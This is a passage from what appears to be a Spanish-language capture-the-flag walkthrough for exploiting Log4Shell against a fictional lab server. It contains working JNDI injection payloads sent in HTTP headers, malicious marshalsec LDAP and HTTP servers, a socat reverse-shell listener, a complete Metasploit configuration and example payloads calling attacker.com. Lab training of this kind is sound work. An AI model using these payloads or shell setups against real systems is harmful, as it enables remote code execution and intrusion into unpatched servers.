MY_IP=$(ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1)
echo "Tu IP en la red compartida: $MY_IP"

# 4. Explotación automatizada (OPCIÓN A: Simplificada)
~/scripts/exploit_log4shell.sh --local-ip $MY_IP --target-ip 10.10.0.100 --port 4444

# O (OPCIÓN B: Explotación Real con marshalsec - RECOMENDADO)
# 4a. Compilar exploit con tu IP (si no está compilado)
compile-exploit $MY_IP
# O: ~/scripts/compile_exploit.sh

# 4b. Iniciar servidores LDAP (marshalsec) y HTTP
~/scripts/start_log4shell_servers.sh
# Esto inicia:
# - Servidor HTTP en puerto 8000 (sirve Exploit.class)
# - Servidor LDAP malicioso (marshalsec) en puerto 1389

# 4c. Iniciar listener de reverse shell
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &

# 4d. Enviar payload Log4Shell real
~/scripts/exploit_log4shell_real.sh
# O manualmente:
curl -H "User-Agent: \${jndi:ldap://$MY_IP:1389/a}" \
     -H "X-Api-Version: \${jndi:ldap://$MY_IP:1389/a}" \
     http://10.10.0.100:8080/

# 5. Verificar conexión reverse shell
ss -antp | grep :4444
# Deberías ver una conexión ESTABLISHED

# 6. Conectarse al servidor víctima (alternativa al reverse shell)
connect

# 7. Explorar el sistema
ls -la
cd /opt/nsa-server
find / -name "*cronos*" 2>/dev/null
cat /opt/nsa-server/logs/server_logs.txt
cat /opt/nsa-server/protocols/protocol_cronos.enc
```

**Nota:** El script `exploit_log4shell.sh` está diseñado para pentesters y requiere especificar las IPs explícitamente para que entiendas qué IPs estás usando en la explotación.

### Opción B: Comandos Manuales

```bash
# 1. Conectarse a la red compartida (⭐ PRIMERO)
connect
# Esto conecta tu contenedor a la red 10.10.0.0/24

# 2. Descubrir IP del servidor
whatweb server.nsa-langley.internal
# Resultado: IP 10.10.0.100

# 3. Escanear puertos
nmap -sV -p 8080 10.10.0.100
# Resultado: Apache Tomcat 9.0.65 en puerto 8080

# 4. Verificar servicio web
curl http://10.10.0.100:8080/
# Deberías ver la página del servidor NSA

# 5. Obtener tu IP en la red compartida (10.10.0.0/24)
MY_IP=$(ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1)
echo "Tu IP: $MY_IP"

# 6. Explotar Log4Shell (OPCIÓN 1: Script automatizado - RECOMENDADO)
~/scripts/exploit_log4shell.sh --local-ip $MY_IP --target-ip 10.10.0.100 --port 4444

# O (OPCIÓN 2: Explotación Real con marshalsec - MÁS REALISTA)
# 6a. Verificar marshalsec (normalmente precompilado en /opt/marshalsec/marshalsec.jar)
# Si no existe, compilar: ver sección "Compilar Marshalsec con Maven" más abajo

# 6b. Compilar exploit
compile-exploit $MY_IP

# 6c. Iniciar servidores
~/scripts/start_log4shell_servers.sh
# Inicia marshalsec LDAP (puerto 1389) y HTTP (puerto 8000)

# 6c. Listener reverse shell
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &

# 6d. Enviar payload (usar puerto LDAP 1389, no el listener 4444)
curl -H "User-Agent: \${jndi:ldap://$MY_IP:1389/a}" \
     -H "X-Api-Version: \${jndi:ldap://$MY_IP:1389/a}" \
     http://10.10.0.100:8080/

# O (OPCIÓN 3: Metasploit)
msfconsole
use exploit/multi/http/log4shell_header_injection
set RHOSTS 10.10.0.100
set RPORT 8080
set TARGETURI /
set payload java/shell_reverse_tcp
set LHOST $MY_IP  # IP en red compartida (10.10.0.x)
set SRVHOST $MY_IP  # ⚠️ Debe ser la misma IP que LHOST
set LPORT 4444
set HTTP_HEADER User-Agent
set ForceExploit true
exploit
exit

# 7. Verificar conexión reverse shell
ss -antp | grep :4444
# Deberías ver conexión ESTABLISHED

# 8. Conectarse al servidor víctima
connect

# 9. Explorar el sistema
ls -la
cd /opt/nsa-server
find / -name "*cronos*" 2>/dev/null
cat /opt/nsa-server/logs/server_logs.txt
cat /opt/nsa-server/protocols/protocol_cronos.enc
```

---

## ⚠️ Puntos Clave

1. **Descubre la IP primero**: Usa `whatweb server.nsa-langley.internal` para obtener la IP del servidor (`10.10.0.100`)

2. **Enumeración es crucial**: Identifica todos los servicios antes de intentar explotar. El puerto `8080` con Apache Tomcat 9.0.65 es el objetivo.

3. **Detecta Log4Shell**: Busca Apache Tomcat con Log4j 2.14.1 en el puerto 8080.

4. **Explota Log4Shell**: 
   - **Con Metasploit**: Usa `exploit/multi/http/log4shell_header_injection` con `set ForceExploit true` si el check automático falla.
   - **Manual (más confiable)**: Usa `curl` con headers HTTP que contengan payloads JNDI (ej: `curl -H 'User-Agent: ${jndi:ldap://TU_IP:1389/a}' http://10.10.0.100:8080/`).

5. **Conéctate después de explotar**: Una vez que Log4Shell fue explotado exitosamente, usa el comando `connect` para acceder al servidor víctima.

6. **Tiempo limitado**: El cortafuegos cuántico se reinicia en 10 minutos después de obtener el shell. Trabaja rápido.

7. **Explora sistemáticamente**: No te saltes directorios, especialmente `/opt/nsa-server/` y sus subdirectorios.

8. **Lee todos los archivos**: Cada archivo puede contener pistas importantes sobre Protocolo Cronos y las líneas temporales.

---

## 🎯 Objetivos de la Misión

La misión se completa cuando:

- ✅ Has descubierto la IP del servidor usando `whatweb server.nsa-langley.internal`
- ✅ Has enumerado el sistema y detectado Log4Shell vulnerable (Apache Tomcat 9.0.65 con Log4j 2.14.1)
- ✅ Has explotado Log4Shell usando Metasploit o explotación manual con `curl`
- ✅ Te has conectado al servidor víctima usando el comando `connect`
- ✅ Has explorado el sistema y encontrado información sobre Protocolo Cronos

---

## 📚 Información Técnica Adicional

### Compilar Marshalsec con Maven

Marshalsec es una herramienta Java que actúa como servidor LDAP/RMI malicioso para explotar Log4Shell. Aunque está precompilado en la imagen `kali-6me:latest`, puedes compilarlo manualmente si es necesario:

**Requisitos:**
- Java JDK (OpenJDK 11 o superior)
- Maven 3.x
- Git

**Pasos de compilación:**

```bash
# 1. Verificar que Java y Maven están instalados
java -version
mvn -version

# Si no están instalados:
apt-get update
apt-get install -y default-jdk maven

# 2. Clonar el repositorio de marshalsec
cd /tmp
rm -rf marshalsec  # Limpiar si existe
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec

# 3. Compilar con Maven
# - clean: Limpia compilaciones anteriores
# - package: Compila y empaqueta en JAR
# - -DskipTests: Salta los tests para acelerar la compilación (⚠️ IMPORTANTE: con 's' al final)
mvn clean package -DskipTests

# ⚠️ NOTA: El comando correcto es -DskipTests (con 's'), NO -DskipTest
# Si usas -DskipTest (sin 's'), Maven ejecutará los tests y pueden fallar en Java 21

# Esto puede tardar varios minutos la primera vez (Maven descarga dependencias)
# Verás mensajes como:
# [INFO] Downloading from central: https://repo.maven.apache.org/...
# [INFO] Building marshalsec 0.0.3-SNAPSHOT
# [INFO] BUILD SUCCESS

# ⚠️ Si ves errores de tests pero el JAR se compiló:
# Los tests pueden fallar en Java 21 (Security Manager deprecated), pero el JAR funciona
# Verifica si el JAR existe: ls -lh target/marshalsec-*.jar

# 4. Copiar el JAR compilado
mkdir -p /opt/marshalsec
cp target/marshalsec-*.jar /opt/marshalsec/marshalsec.jar

# 5. Verificar que se compiló correctamente
ls -lh /opt/marshalsec/marshalsec.jar
# Deberías ver algo como: marshalsec.jar (alrededor de 1-2 MB)

# 6. Probar marshalsec
java -cp /opt/marshalsec/marshalsec.jar marshalsec.jndi.LDAPRefServer --help
# Deberías ver la ayuda de marshalsec
```

**Uso de marshalsec:**

```bash
# Iniciar servidor LDAP malicioso
# Sintaxis: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://TU_IP:PUERTO_HTTP/#Exploit"
java -cp /opt/marshalsec/marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.10.0.8:8000/#Exploit"

# Esto iniciará un servidor LDAP en el puerto 1389 (por defecto)
# Cuando el servidor víctima se conecte, marshalsec redirigirá a la URL especificada
# donde debe estar el Exploit.class compilado
```

**Troubleshooting:**

**Error común: "BUILD FAILURE" por tests fallidos**

Si ves `BUILD FAILURE` pero el JAR se compiló (los tests fallaron):
```bash
# Verificar si el JAR existe a pesar del error
ls -lh target/marshalsec-*.jar

# Si existe, copiarlo directamente
cp target/marshalsec-*.jar /opt/marshalsec/marshalsec.jar
```

**Los tests fallan en Java 21** porque `SecurityManager` fue deprecado. Esto es normal y el JAR funciona correctamente.

**Si la compilación realmente falla:**
```bash
# Ver logs detallados
cat /tmp/marshalsec_build.log

# Verificar que Maven puede descargar dependencias
mvn dependency:resolve

# Limpiar y reintentar con el comando correcto
cd /tmp/marshalsec
mvn clean
mvn package -DskipTests  # ⚠️ Con 's' al final
```

**Comando correcto:**
- ✅ `mvn clean package -DskipTests` (con 's' al final)
- ❌ `mvn clean package -DskipTest` (sin 's' - ejecutará los tests)

**Comandos Maven explicados:**
- `mvn clean`: Elimina archivos compilados anteriores (`target/`)
- `mvn package`: Compila el código fuente y empaqueta en un JAR ejecutable
- `-DskipTests`: Salta la ejecución de tests unitarios (acelera la compilación)
- El JAR resultante estará en `target/marshalsec-*.jar`

### Payloads Log4Shell comunes

- `${jndi:ldap://attacker.com/a}` - Payload LDAP básico
- `${jndi:rmi://attacker.com/a}` - Payload RMI alternativo
- `${jndi:dns://attacker.com/a}` - Payload DNS para verificación

### Headers HTTP vulnerables

El servidor procesa payloads Log4Shell en los siguientes headers:
- `User-Agent`
- `X-Api-Version`
- Cualquier header personalizado que el servidor registre en logs

### Nota sobre Metasploit

Cuando uses `msfconsole`, recuerda que estás dentro del prompt de Metasploit (`msf6 >`). Todos los comandos de configuración (`set`, `use`, `exploit`) deben ejecutarse dentro de Metasploit, no en la terminal normal de Kali Linux.

Para salir de Metasploit, usa:
```bash
exit
```

---

## 🔗 Recursos Adicionales

- [CVE-2021-44228 (Log4Shell)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [Metasploit Log4Shell Exploit](https://www.rapid7.com/db/modules/exploit/multi/http/log4shell_header_injection/)
- [Apache Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)

---

**¡Buena suerte, hacker!** 🎯
